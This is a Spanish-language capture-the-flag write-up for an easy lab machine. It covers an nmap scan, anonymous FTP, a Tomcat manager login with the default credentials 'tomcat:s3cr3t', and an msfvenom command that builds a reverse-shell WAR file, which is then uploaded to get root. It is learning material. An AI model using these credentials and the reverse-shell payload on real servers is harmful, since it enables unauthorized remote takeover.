---
description: '🧠Dificultad: Fácil | 🔓13/03/2026'
---

# 🟩 -Pn

## 🕵️ Reconocimiento

Comenzamos con un escaneo de puertos con `nmap`:

```bash
nmap -sC -sV -Pn $IPTARGET | tee nmap
```

<figure><img src="../../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>

Hay un servicio web `Tomcat` corriendo en el puerto 8080. Vemos que en el servicio FTP está habilitado inicio de sesión anónimo (sin usar credenciales). Nos conectamos al ftp y nos llevamos un fichero que había en él.

<figure><img src="../../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Parece que se han dejado el TomCat sin configurar. Si intentamos acceder al manager del Tomcat, nos muestra esto:

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Requiere autenticación para entrar. Podemos probar usuarios y contraseñas por defecto para ver si podemos entrar al panel.

Aquí creo que hay un pequeño error, puesto que una contraseña por defecto suele ser `s3cret` (se muestra incluso en la página enseñada anteriormente), pero la contraseña usada aquí es `s3cr3t`. Probablemente si estás leyendo esto, sea porque te hayas atascado aquí. Las credenciales por defecto han sido sacadas de [HackTricks](https://hacktricks.wiki/es/network-services-pentesting/pentesting-web/tomcat/index.html): `tomcat:s3cr3t`.

Una vez introducido el usuario y contraseña en el directorio `/manager/html`, podemos acceder al directorio.&#x20;

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que hay una sección donde podemos subir nuestra propia aplicación al Tomcat.

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## 🚪 Ganando acceso

Creamos un fichero `.war` que ejecute una reverse shell hacia nuestra máquina.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=9999 -f war > reverse.war
```

Después de subirla desde la sección mostrada anteriormente, aparece en la lista de aplicaciones.

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos ponemos a la escucha con netcat desde nuestra máquina y ejecutamos la aplicación (con darle click al vínculo de la primera columna de la tabla de aplicaciones, basta).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Hemos conseguido acceso como `root` directo, por lo que no necesitamos escalar privilegios.
